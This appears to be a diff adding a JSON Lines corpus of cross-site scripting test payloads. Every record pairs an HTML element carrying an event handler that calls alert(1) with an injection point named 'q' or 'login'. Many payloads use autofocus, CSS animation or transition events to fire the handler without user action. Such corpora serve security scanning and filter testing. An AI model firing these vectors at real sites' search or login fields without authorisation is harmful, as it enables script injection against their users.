+{"id": "xss-74165ee6-q", "payload": "<hr onmouseenter=\"alert(1)\">test</hr>", "injection_point": "q", "fragment": false}
+{"id": "xss-74165ee6-login", "payload": "<hr onmouseenter=\"alert(1)\">test</hr>", "injection_point": "login", "fragment": false}
+{"id": "xss-c34c5de0-q", "payload": "<iframe oncontextmenu=\"alert(1)\">test</iframe>", "injection_point": "q", "fragment": false}
+{"id": "xss-c34c5de0-login", "payload": "<iframe oncontextmenu=\"alert(1)\">test</iframe>", "injection_point": "login", "fragment": false}
+{"id": "xss-5487f4d8-q", "payload": "<image oncontextmenu=\"alert(1)\">test</image>", "injection_point": "q", "fragment": false}
+{"id": "xss-5487f4d8-login", "payload": "<image oncontextmenu=\"alert(1)\">test</image>", "injection_point": "login", "fragment": false}
+{"id": "xss-e5de81bb-q", "payload": "<image ondblclick=\"alert(1)\">test</image>", "injection_point": "q", "fragment": false}
+{"id": "xss-e5de81bb-login", "payload": "<image ondblclick=\"alert(1)\">test</image>", "injection_point": "login", "fragment": false}
+{"id": "xss-b4c4c170-q", "payload": "<img src=validimage.png onload=alert(1)>", "injection_point": "q", "fragment": false}
+{"id": "xss-b4c4c170-login", "payload": "<img src=validimage.png onload=alert(1)>", "injection_point": "login", "fragment": false}
+{"id": "xss-eb4cfe84-q", "payload": "<input type=image onloadstart=alert(1) src=validimage.png>", "injection_point": "q", "fragment": false}
+{"id": "xss-eb4cfe84-login", "payload": "<input type=image onloadstart=alert(1) src=validimage.png>", "injection_point": "login", "fragment": false}
+{"id": "xss-084ae1ec-q", "payload": "<ins oncopy=\"alert(1)\" contenteditable>test</ins>", "injection_point": "q", "fragment": false}
+{"id": "xss-084ae1ec-login", "payload": "<ins oncopy=\"alert(1)\" contenteditable>test</ins>", "injection_point": "login", "fragment": false}
+{"id": "xss-38383969-q", "payload": "<ins onkeyup=\"alert(1)\" contenteditable>test</ins>", "injection_point": "q", "fragment": false}
+{"id": "xss-38383969-login", "payload": "<ins onkeyup=\"alert(1)\" contenteditable>test</ins>", "injection_point": "login", "fragment": false}
+{"id": "xss-881166b0-q", "payload": "<keygen id=x tabindex=1 onbeforeactivate=alert(1)></keygen>", "injection_point": "q", "fragment": false}
+{"id": "xss-881166b0-login", "payload": "<keygen id=x tabindex=1 onbeforeactivate=alert(1)></keygen>", "injection_point": "login", "fragment": false}
+{"id": "xss-242d3f2a-q", "payload": "<keygen onkeyup=\"alert(1)\" contenteditable>test</keygen>", "injection_point": "q", "fragment": false}
+{"id": "xss-242d3f2a-login", "payload": "<keygen onkeyup=\"alert(1)\" contenteditable>test</keygen>", "injection_point": "login", "fragment": false}
+{"id": "xss-cbc87996-q", "payload": "<legend onclick=\"alert(1)\">test</legend>", "injection_point": "q", "fragment": false}
+{"id": "xss-cbc87996-login", "payload": "<legend onclick=\"alert(1)\">test</legend>", "injection_point": "login", "fragment": false}
+{"id": "xss-6f6d3854-q", "payload": "<link draggable=\"true\" ondragend=\"alert(1)\">test</link>", "injection_point": "q", "fragment": false}
+{"id": "xss-6f6d3854-login", "payload": "<link draggable=\"true\" ondragend=\"alert(1)\">test</link>", "injection_point": "login", "fragment": false}
+{"id": "xss-75a48f8c-q", "payload": "<link id=x tabindex=1 onbeforedeactivate=alert(1)></link><input autofocus>", "injection_point": "q", "fragment": false}
+{"id": "xss-75a48f8c-login", "payload": "<link id=x tabindex=1 onbeforedeactivate=alert(1)></link><input autofocus>", "injection_point": "login", "fragment": false}
+{"id": "xss-d052c743-q", "payload": "<link onpaste=\"alert(1)\" contenteditable>test</link>", "injection_point": "q", "fragment": false}
+{"id": "xss-d052c743-login", "payload": "<link onpaste=\"alert(1)\" contenteditable>test</link>", "injection_point": "login", "fragment": false}
+{"id": "xss-f5ea9dbe-q", "payload": "<main draggable=\"true\" ondrag=\"alert(1)\">test</main>", "injection_point": "q", "fragment": false}
+{"id": "xss-f5ea9dbe-login", "payload": "<main draggable=\"true\" ondrag=\"alert(1)\">test</main>", "injection_point": "login", "fragment": false}
+{"id": "xss-82774b52-q", "payload": "<main id=x tabindex=1 ondeactivate=alert(1)></main><input id=y autofocus>", "injection_point": "q", "fragment": false}
+{"id": "xss-82774b52-login", "payload": "<main id=x tabindex=1 ondeactivate=alert(1)></main><input id=y autofocus>", "injection_point": "login", "fragment": false}
+{"id": "xss-5f84aa4b-q", "payload": "<map oncontextmenu=\"alert(1)\">test</map>", "injection_point": "q", "fragment": false}
+{"id": "xss-5f84aa4b-login", "payload": "<map oncontextmenu=\"alert(1)\">test</map>", "injection_point": "login", "fragment": false}
+{"id": "xss-7fcd03b6-q", "payload": "<mark draggable=\"true\" ondragstart=\"alert(1)\">test</mark>", "injection_point": "q", "fragment": false}
+{"id": "xss-7fcd03b6-login", "payload": "<mark draggable=\"true\" ondragstart=\"alert(1)\">test</mark>", "injection_point": "login", "fragment": false}
+{"id": "xss-745a23da-q", "payload": "<mark id=x tabindex=1 onactivate=alert(1)></mark>", "injection_point": "q", "fragment": false}
+{"id": "xss-745a23da-login", "payload": "<mark id=x tabindex=1 onactivate=alert(1)></mark>", "injection_point": "login", "fragment": false}
+{"id": "xss-f5f42e41-q", "payload": "<mark id=x tabindex=1 onfocus=alert(1)></mark>", "injection_point": "q", "fragment": false}
+{"id": "xss-f5f42e41-login", "payload": "<mark id=x tabindex=1 onfocus=alert(1)></mark>", "injection_point": "login", "fragment": false}
+{"id": "xss-f6546f20-q", "payload": "<mark onmouseleave=\"alert(1)\">test</mark>", "injection_point": "q", "fragment": false}
+{"id": "xss-f6546f20-login", "payload": "<mark onmouseleave=\"alert(1)\">test</mark>", "injection_point": "login", "fragment": false}
+{"id": "xss-4b80e311-q", "payload": "<meter onclick=\"alert(1)\">test</meter>", "injection_point": "q", "fragment": false}
+{"id": "xss-4b80e311-login", "payload": "<meter onclick=\"alert(1)\">test</meter>", "injection_point": "login", "fragment": false}
+{"id": "xss-91df1d57-q", "payload": "<multicol onbeforecut=\"alert(1)\" contenteditable>test</multicol>", "injection_point": "q", "fragment": false}
+{"id": "xss-91df1d57-login", "payload": "<multicol onbeforecut=\"alert(1)\" contenteditable>test</multicol>", "injection_point": "login", "fragment": false}
+{"id": "xss-2aae35b7-q", "payload": "<multicol oncut=\"alert(1)\" contenteditable>test</multicol>", "injection_point": "q", "fragment": false}
+{"id": "xss-2aae35b7-login", "payload": "<multicol oncut=\"alert(1)\" contenteditable>test</multicol>", "injection_point": "login", "fragment": false}
+{"id": "xss-2a14e8d0-q", "payload": "<noembed draggable=\"true\" ondragstart=\"alert(1)\">test</noembed>", "injection_point": "q", "fragment": false}
+{"id": "xss-2a14e8d0-login", "payload": "<noembed draggable=\"true\" ondragstart=\"alert(1)\">test</noembed>", "injection_point": "login", "fragment": false}
+{"id": "xss-8d826f6d-q", "payload": "<object onbeforecut=\"alert(1)\" contenteditable>test</object>", "injection_point": "q", "fragment": false}
+{"id": "xss-8d826f6d-login", "payload": "<object onbeforecut=\"alert(1)\" contenteditable>test</object>", "injection_point": "login", "fragment": false}
+{"id": "xss-78390f73-q", "payload": "<object onblur=alert(1) tabindex=1 id=x></object><input autofocus>", "injection_point": "q", "fragment": false}
+{"id": "xss-78390f73-login", "payload": "<object onblur=alert(1) tabindex=1 id=x></object><input autofocus>", "injection_point": "login", "fragment": false}
+{"id": "xss-088208c1-q", "payload": "<ol onpaste=\"alert(1)\" contenteditable>test</ol>", "injection_point": "q", "fragment": false}
+{"id": "xss-088208c1-login", "payload": "<ol onpaste=\"alert(1)\" contenteditable>test</ol>", "injection_point": "login", "fragment": false}
+{"id": "xss-2660e630-q", "payload": "<option onmouseover=\"alert(1)\">test</option>", "injection_point": "q", "fragment": false}
+{"id": "xss-2660e630-login", "payload": "<option onmouseover=\"alert(1)\">test</option>", "injection_point": "login", "fragment": false}
+{"id": "xss-e0e52a03-q", "payload": "<p onclick=\"alert(1)\">test</p>", "injection_point": "q", "fragment": false}
+{"id": "xss-e0e52a03-login", "payload": "<p onclick=\"alert(1)\">test</p>", "injection_point": "login", "fragment": false}
+{"id": "xss-f3801f1d-q", "payload": "<plaintext onpaste=\"alert(1)\" contenteditable>test</plaintext>", "injection_point": "q", "fragment": false}
+{"id": "xss-f3801f1d-login", "payload": "<plaintext onpaste=\"alert(1)\" contenteditable>test</plaintext>", "injection_point": "login", "fragment": false}
+{"id": "xss-6f7f8fa9-q", "payload": "<pre id=x tabindex=1 onfocus=alert(1)></pre>", "injection_point": "q", "fragment": false}
+{"id": "xss-6f7f8fa9-login", "payload": "<pre id=x tabindex=1 onfocus=alert(1)></pre>", "injection_point": "login", "fragment": false}
+{"id": "xss-1cd6a027-q", "payload": "<progress onkeypress=\"alert(1)\" contenteditable>test</progress>", "injection_point": "q", "fragment": false}
+{"id": "xss-1cd6a027-login", "payload": "<progress onkeypress=\"alert(1)\" contenteditable>test</progress>", "injection_point": "login", "fragment": false}
+{"id": "xss-29c9c344-q", "payload": "<rb onmousedown=\"alert(1)\">test</rb>", "injection_point": "q", "fragment": false}
+{"id": "xss-29c9c344-login", "payload": "<rb onmousedown=\"alert(1)\">test</rb>", "injection_point": "login", "fragment": false}
+{"id": "xss-9f8d9f0e-q", "payload": "<rt onmouseup=\"alert(1)\">test</rt>", "injection_point": "q", "fragment": false}
+{"id": "xss-9f8d9f0e-login", "payload": "<rt onmouseup=\"alert(1)\">test</rt>", "injection_point": "login", "fragment": false}
+{"id": "xss-8b2284ba-q", "payload": "<rtc oncopy=\"alert(1)\" contenteditable>test</rtc>", "injection_point": "q", "fragment": false}
+{"id": "xss-8b2284ba-login", "payload": "<rtc oncopy=\"alert(1)\" contenteditable>test</rtc>", "injection_point": "login", "fragment": false}
+{"id": "xss-2e32506e-q", "payload": "<ruby id=x tabindex=1 onfocus=alert(1)></ruby>", "injection_point": "q", "fragment": false}
+{"id": "xss-2e32506e-login", "payload": "<ruby id=x tabindex=1 onfocus=alert(1)></ruby>", "injection_point": "login", "fragment": false}
+{"id": "xss-af82232c-q", "payload": "<ruby onpaste=\"alert(1)\" contenteditable>test</ruby>", "injection_point": "q", "fragment": false}
+{"id": "xss-af82232c-login", "payload": "<ruby onpaste=\"alert(1)\" contenteditable>test</ruby>", "injection_point": "login", "fragment": false}
+{"id": "xss-c2e816dc-q", "payload": "<shadow onbeforecopy=\"alert(1)\" contenteditable>test</shadow>", "injection_point": "q", "fragment": false}
+{"id": "xss-c2e816dc-login", "payload": "<shadow onbeforecopy=\"alert(1)\" contenteditable>test</shadow>", "injection_point": "login", "fragment": false}
+{"id": "xss-1bac262c-q", "payload": "<slot onclick=\"alert(1)\">test</slot>", "injection_point": "q", "fragment": false}
+{"id": "xss-1bac262c-login", "payload": "<slot onclick=\"alert(1)\">test</slot>", "injection_point": "login", "fragment": false}
+{"id": "xss-acc2137b-q", "payload": "<slot oncontextmenu=\"alert(1)\">test</slot>", "injection_point": "q", "fragment": false}
+{"id": "xss-acc2137b-login", "payload": "<slot oncontextmenu=\"alert(1)\">test</slot>", "injection_point": "login", "fragment": false}
+{"id": "xss-a788104b-q", "payload": "<slot ondblclick=\"alert(1)\">test</slot>", "injection_point": "q", "fragment": false}
+{"id": "xss-a788104b-login", "payload": "<slot ondblclick=\"alert(1)\">test</slot>", "injection_point": "login", "fragment": false}
+{"id": "xss-5a5e7614-q", "payload": "<source onmouseout=\"alert(1)\">test</source>", "injection_point": "q", "fragment": false}
+{"id": "xss-5a5e7614-login", "payload": "<source onmouseout=\"alert(1)\">test</source>", "injection_point": "login", "fragment": false}
+{"id": "xss-b9e35e85-q", "payload": "<spacer draggable=\"true\" ondrag=\"alert(1)\">test</spacer>", "injection_point": "q", "fragment": false}
+{"id": "xss-b9e35e85-login", "payload": "<spacer draggable=\"true\" ondrag=\"alert(1)\">test</spacer>", "injection_point": "login", "fragment": false}
+{"id": "xss-2729f09f-q", "payload": "<spacer onmousedown=\"alert(1)\">test</spacer>", "injection_point": "q", "fragment": false}
+{"id": "xss-2729f09f-login", "payload": "<spacer onmousedown=\"alert(1)\">test</spacer>", "injection_point": "login", "fragment": false}
+{"id": "xss-c2b4f18b-q", "payload": "<span ondblclick=\"alert(1)\">test</span>", "injection_point": "q", "fragment": false}
+{"id": "xss-c2b4f18b-login", "payload": "<span ondblclick=\"alert(1)\">test</span>", "injection_point": "login", "fragment": false}
+{"id": "xss-b5345992-q", "payload": "<span onmousemove=\"alert(1)\">test</span>", "injection_point": "q", "fragment": false}
+{"id": "xss-b5345992-login", "payload": "<span onmousemove=\"alert(1)\">test</span>", "injection_point": "login", "fragment": false}
+{"id": "xss-c6be9cd0-q", "payload": "<style onkeypress=\"alert(1)\" contenteditable>test</style>", "injection_point": "q", "fragment": false}
+{"id": "xss-c6be9cd0-login", "payload": "<style onkeypress=\"alert(1)\" contenteditable>test</style>", "injection_point": "login", "fragment": false}
+{"id": "xss-41a77ac0-q", "payload": "<style>:target {color: red;}</style><big id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></big>", "injection_point": "q", "fragment": false}
+{"id": "xss-41a77ac0-login", "payload": "<style>:target {color: red;}</style><big id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></big>", "injection_point": "login", "fragment": false}
+{"id": "xss-e164ffc8-q", "payload": "<style>:target {color: red;}</style><em id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></em>", "injection_point": "q", "fragment": false}
+{"id": "xss-e164ffc8-login", "payload": "<style>:target {color: red;}</style><em id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></em>", "injection_point": "login", "fragment": false}
+{"id": "xss-784791cd-q", "payload": "<style>:target {color: red;}</style><td id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></td>", "injection_point": "q", "fragment": false}
+{"id": "xss-784791cd-login", "payload": "<style>:target {color: red;}</style><td id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></td>", "injection_point": "login", "fragment": false}
+{"id": "xss-e5b21eaa-q", "payload": "<style>:target {color: red;}</style><th id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></th>", "injection_point": "q", "fragment": false}
+{"id": "xss-e5b21eaa-login", "payload": "<style>:target {color: red;}</style><th id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></th>", "injection_point": "login", "fragment": false}
+{"id": "xss-800032a2-q", "payload": "<style>:target {color:red;}</style><base id=x style=\"transition:color 1s\" ontransitionend=alert(1)></base>", "injection_point": "q", "fragment": false}
+{"id": "xss-800032a2-login", "payload": "<style>:target {color:red;}</style><base id=x style=\"transition:color 1s\" ontransitionend=alert(1)></base>", "injection_point": "login", "fragment": false}
+{"id": "xss-690d2cf3-q", "payload": "<style>:target {color:red;}</style><marquee id=x style=\"transition:color 1s\" ontransitionend=alert(1)></marquee>", "injection_point": "q", "fragment": false}
+{"id": "xss-690d2cf3-login", "payload": "<style>:target {color:red;}</style><marquee id=x style=\"transition:color 1s\" ontransitionend=alert(1)></marquee>", "injection_point": "login", "fragment": false}
+{"id": "xss-ce5bd2e0-q", "payload": "<style>:target {color:red;}</style><wbr id=x style=\"transition:color 1s\" ontransitionend=alert(1)></wbr>", "injection_point": "q", "fragment": false}
+{"id": "xss-ce5bd2e0-login", "payload": "<style>:target {color:red;}</style><wbr id=x style=\"transition:color 1s\" ontransitionend=alert(1)></wbr>", "injection_point": "login", "fragment": false}
+{"id": "xss-7b6aff1e-q", "payload": "<style>:target {transform: rotate(180deg);}</style><a id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></a>", "injection_point": "q", "fragment": false}
+{"id": "xss-7b6aff1e-login", "payload": "<style>:target {transform: rotate(180deg);}</style><a id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></a>", "injection_point": "login", "fragment": false}
+{"id": "xss-6e36fe5f-q", "payload": "<style>:target {transform: rotate(180deg);}</style><button id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></button>", "injection_point": "q", "fragment": false}
+{"id": "xss-6e36fe5f-login", "payload": "<style>:target {transform: rotate(180deg);}</style><button id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></button>", "injection_point": "login", "fragment": false}
+{"id": "xss-18234958-q", "payload": "<style>:target {transform: rotate(180deg);}</style><header id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></header>", "injection_point": "q", "fragment": false}
+{"id": "xss-18234958-login", "payload": "<style>:target {transform: rotate(180deg);}</style><header id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></header>", "injection_point": "login", "fragment": false}
+{"id": "xss-d3c7470e-q", "payload": "<style>:target {transform: rotate(180deg);}</style><hr id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></hr>", "injection_point": "q", "fragment": false}
+{"id": "xss-d3c7470e-login", "payload": "<style>:target {transform: rotate(180deg);}</style><hr id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></hr>", "injection_point": "login", "fragment": false}
+{"id": "xss-be8ca25b-q", "payload": "<style>:target {transform: rotate(180deg);}</style><keygen id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></keygen>", "injection_point": "q", "fragment": false}
+{"id": "xss-be8ca25b-login", "payload": "<style>:target {transform: rotate(180deg);}</style><keygen id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></keygen>", "injection_point": "login", "fragment": false}
+{"id": "xss-f02146d5-q", "payload": "<style>:target {transform: rotate(180deg);}</style><object id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></object>", "injection_point": "q", "fragment": false}
+{"id": "xss-f02146d5-login", "payload": "<style>:target {transform: rotate(180deg);}</style><object id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></object>", "injection_point": "login", "fragment": false}
+{"id": "xss-c3c1d615-q", "payload": "<style>:target {transform: rotate(180deg);}</style><q id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></q>", "injection_point": "q", "fragment": false}
+{"id": "xss-c3c1d615-login", "payload": "<style>:target {transform: rotate(180deg);}</style><q id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></q>", "injection_point": "login", "fragment": false}
+{"id": "xss-c1d13dea-q", "payload": "<style>@keyframes slidein {}</style><bgsound style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></bgsound>", "injection_point": "q", "fragment": false}
+{"id": "xss-c1d13dea-login", "payload": "<style>@keyframes slidein {}</style><bgsound style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></bgsound>", "injection_point": "login", "fragment": false}
+{"id": "xss-5dd022df-q", "payload": "<style>@keyframes slidein {}</style><meta style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></meta>", "injection_point": "q", "fragment": false}
+{"id": "xss-5dd022df-login", "payload": "<style>@keyframes slidein {}</style><meta style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></meta>", "injection_point": "login", "fragment": false}
+{"id": "xss-13d35b8f-q", "payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><acronym id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></acronym>", "injection_point": "q", "fragment": false}
+{"id": "xss-13d35b8f-login", "payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><acronym id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></acronym>", "injection_point": "login", "fragment": false}
+{"id": "xss-84f65a00-q", "payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dfn id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></dfn>", "injection_point": "q", "fragment": false}
+{"id": "xss-84f65a00-login", "payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dfn id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></dfn>", "injection_point": "login", "fragment": false}
+{"id": "xss-b8a43c0e-q", "payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><keygen id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></keygen>", "injection_point": "q", "fragment": false}
+{"id": "xss-b8a43c0e-login", "payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><keygen id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></keygen>", "injection_point": "login", "fragment": false}
+{"id": "xss-f47acdc3-q", "payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><pre id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></pre>", "injection_point": "q", "fragment": false}
+{"id": "xss-f47acdc3-login", "payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><pre id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></pre>", "injection_point": "login", "fragment": false}
+{"id": "xss-d708ffc6-q", "payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rp id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></rp>", "injection_point": "q", "fragment": false}
+{"id": "xss-d708ffc6-login", "payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><rp id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></rp>", "injection_point": "login", "fragment": false}
+{"id": "xss-545d1ff8-q", "payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></sub>", "injection_point": "q", "fragment": false}
+{"id": "xss-545d1ff8-login", "payload": "<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><sub id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></sub>", "injection_point": "login", "fragment": false}
+{"id": "xss-b23d829b-q", "payload": "<style>@keyframes x{}</style><big style=\"animation-name:x\" onanimationend=\"alert(1)\"></big>", "injection_point": "q", "fragment": false}
+{"id": "xss-b23d829b-login", "payload": "<style>@keyframes x{}</style><big style=\"animation-name:x\" onanimationend=\"alert(1)\"></big>", "injection_point": "login", "fragment": false}
+{"id": "xss-9d9144c5-q", "payload": "<style>@keyframes x{}</style><div style=\"animation-name:x\" onanimationend=\"alert(1)\"></div>", "injection_point": "q", "fragment": false}
+{"id": "xss-9d9144c5-login", "payload": "<style>@keyframes x{}</style><div style=\"animation-name:x\" onanimationend=\"alert(1)\"></div>", "injection_point": "login", "fragment": false}
+{"id": "xss-6fe17b4c-q", "payload": "<style>@keyframes x{}</style><embed style=\"animation-name:x\" onanimationstart=\"alert(1)\"></embed>", "injection_point": "q", "fragment": false}
+{"id": "xss-6fe17b4c-login", "payload": "<style>@keyframes x{}</style><embed style=\"animation-name:x\" onanimationstart=\"alert(1)\"></embed>", "injection_point": "login", "fragment": false}
+{"id": "xss-76eeafd9-q", "payload": "<style>@keyframes x{}</style><marquee style=\"animation-name:x\" onanimationend=\"alert(1)\"></marquee>", "injection_point": "q", "fragment": false}
+{"id": "xss-76eeafd9-login", "payload": "<style>@keyframes x{}</style><marquee style=\"animation-name:x\" onanimationend=\"alert(1)\"></marquee>", "injection_point": "login", "fragment": false}
+{"id": "xss-a537e519-q", "payload": "<style>@keyframes x{}</style><meter style=\"animation-name:x\" onanimationend=\"alert(1)\"></meter>", "injection_point": "q", "fragment": false}
+{"id": "xss-a537e519-login", "payload": "<style>@keyframes x{}</style><meter style=\"animation-name:x\" onanimationend=\"alert(1)\"></meter>", "injection_point": "login", "fragment": false}
+{"id": "xss-b41b5123-q", "payload": "<style>@keyframes x{}</style><nextid style=\"animation-name:x\" onanimationstart=\"alert(1)\"></nextid>", "injection_point": "q", "fragment": false}
+{"id": "xss-b41b5123-login", "payload": "<style>@keyframes x{}</style><nextid style=\"animation-name:x\" onanimationstart=\"alert(1)\"></nextid>", "injection_point": "login", "fragment": false}
+{"id": "xss-56083d09-q", "payload": "<style>@keyframes x{}</style><samp style=\"animation-name:x\" onanimationstart=\"alert(1)\"></samp>", "injection_point": "q", "fragment": false}
+{"id": "xss-56083d09-login", "payload": "<style>@keyframes x{}</style><samp style=\"animation-name:x\" onanimationstart=\"alert(1)\"></samp>", "injection_point": "login", "fragment": false}
+{"id": "xss-dc1919f8-q", "payload": "<style>@keyframes x{}</style><tt style=\"animation-name:x\" onanimationend=\"alert(1)\"></tt>", "injection_point": "q", "fragment": false}
+{"id": "xss-dc1919f8-login", "payload": "<style>@keyframes x{}</style><tt style=\"animation-name:x\" onanimationend=\"alert(1)\"></tt>", "injection_point": "login", "fragment": false}
+{"id": "xss-d053b38d-q", "payload": "<sub onmousedown=\"alert(1)\">test</sub>", "injection_point": "q", "fragment": false}
+{"id": "xss-d053b38d-login", "payload": "<sub onmousedown=\"alert(1)\">test</sub>", "injection_point": "login", "fragment": false}
+{"id": "xss-e02de37a-q", "payload": "<svg onbeforecut=\"alert(1)\" contenteditable>test</svg>", "injection_point": "q", "fragment": false}
+{"id": "xss-e02de37a-login", "payload": "<svg onbeforecut=\"alert(1)\" contenteditable>test</svg>", "injection_point": "login", "fragment": false}
+{"id": "xss-51aa4552-q", "payload": "<svg oncut=\"alert(1)\" contenteditable>test</svg>", "injection_point": "q", "fragment": false}
+{"id": "xss-51aa4552-login", "payload": "<svg oncut=\"alert(1)\" contenteditable>test</svg>", "injection_point": "login", "fragment": false}
+{"id": "xss-2cb0a90d-q", "payload": "<svg><set onend=alert(1) attributename=x dur=1s>", "injection_point": "q", "fragment": false}
+{"id": "xss-2cb0a90d-login", "payload": "<svg><set onend=alert(1) attributename=x dur=1s>", "injection_point": "login", "fragment": false}
+{"id": "xss-9f48d70c-q", "payload": "<svg><wbr onload=alert(1)></wbr>", "injection_point": "q", "fragment": false}
+{"id": "xss-9f48d70c-login", "payload": "<svg><wbr onload=alert(1)></wbr>", "injection_point": "login", "fragment": false}
+{"id": "xss-0fac60d6-q", "payload": "<tbody onmouseup=\"alert(1)\">test</tbody>", "injection_point": "q", "fragment": false}
+{"id": "xss-0fac60d6-login", "payload": "<tbody onmouseup=\"alert(1)\">test</tbody>", "injection_point": "login", "fragment": false}
+{"id": "xss-7d3dfe65-q", "payload": "<textarea ondblclick=\"alert(1)\">test</textarea>", "injection_point": "q", "fragment": false}
+{"id": "xss-7d3dfe65-login", "payload": "<textarea ondblclick=\"alert(1)\">test</textarea>", "injection_point": "login", "fragment": false}
+{"id": "xss-cdaeee46-q", "payload": "<textarea onmousedown=\"alert(1)\">test</textarea>", "injection_point": "q", "fragment": false}
+{"id": "xss-cdaeee46-login", "payload": "<textarea onmousedown=\"alert(1)\">test</textarea>", "injection_point": "login", "fragment": false}
+{"id": "xss-9f53d233-q", "payload": "<tfoot onmousedown=\"alert(1)\">test</tfoot>", "injection_point": "q", "fragment": false}
+{"id": "xss-9f53d233-login", "payload": "<tfoot onmousedown=\"alert(1)\">test</tfoot>", "injection_point": "login", "fragment": false}
+{"id": "xss-8f5b4e90-q", "payload": "<tfoot onmouseout=\"alert(1)\">test</tfoot>", "injection_point": "q", "fragment": false}
+{"id": "xss-8f5b4e90-login", "payload": "<tfoot onmouseout=\"alert(1)\">test</tfoot>", "injection_point": "login", "fragment": false}
+{"id": "xss-52f2aa89-q", "payload": "<title onmouseenter=\"alert(1)\">test</title>", "injection_point": "q", "fragment": false}
+{"id": "xss-52f2aa89-login", "payload": "<title onmouseenter=\"alert(1)\">test</title>", "injection_point": "login", "fragment": false}
+{"id": "xss-369d0b75-q", "payload": "<tr draggable=\"true\" ondragend=\"alert(1)\">test</tr>", "injection_point": "q", "fragment": false}
+{"id": "xss-369d0b75-login", "payload": "<tr draggable=\"true\" ondragend=\"alert(1)\">test</tr>", "injection_point": "login", "fragment": false}
+{"id": "xss-e8287f4c-q", "payload": "<tr onmouseover=\"alert(1)\">test</tr>", "injection_point": "q", "fragment": false}
+{"id": "xss-e8287f4c-login", "payload": "<tr onmouseover=\"alert(1)\">test</tr>", "injection_point": "login", "fragment": false}
+{"id": "xss-8febeed3-q", "payload": "<track id=x tabindex=1 onfocus=alert(1)></track>", "injection_point": "q", "fragment": false}
+{"id": "xss-8febeed3-login", "payload": "<track id=x tabindex=1 onfocus=alert(1)></track>", "injection_point": "login", "fragment": false}
+{"id": "xss-f22c2acc-q", "payload": "<track id=x tabindex=1 onfocusin=alert(1)></track>", "injection_point": "q", "fragment": false}
+{"id": "xss-f22c2acc-login", "payload": "<track id=x tabindex=1 onfocusin=alert(1)></track>", "injection_point": "login", "fragment": false}
+{"id": "xss-86e9f21a-q", "payload": "<track onbeforecopy=\"alert(1)\" contenteditable>test</track>", "injection_point": "q", "fragment": false}
+{"id": "xss-86e9f21a-login", "payload": "<track onbeforecopy=\"alert(1)\" contenteditable>test</track>", "injection_point": "login", "fragment": false}
+{"id": "xss-db5beac3-q", "payload": "<track onkeydown=\"alert(1)\" contenteditable>test</track>", "injection_point": "q", "fragment": false}
+{"id": "xss-db5beac3-login", "payload": "<track onkeydown=\"alert(1)\" contenteditable>test</track>", "injection_point": "login", "fragment": false}
+{"id": "xss-0750e19b-q", "payload": "<tt ondblclick=\"alert(1)\">test</tt>", "injection_point": "q", "fragment": false}
+{"id": "xss-0750e19b-login", "payload": "<tt ondblclick=\"alert(1)\">test</tt>", "injection_point": "login", "fragment": false}
+{"id": "xss-05e1f920-q", "payload": "<var draggable=\"true\" ondrag=\"alert(1)\">test</var>", "injection_point": "q", "fragment": false}
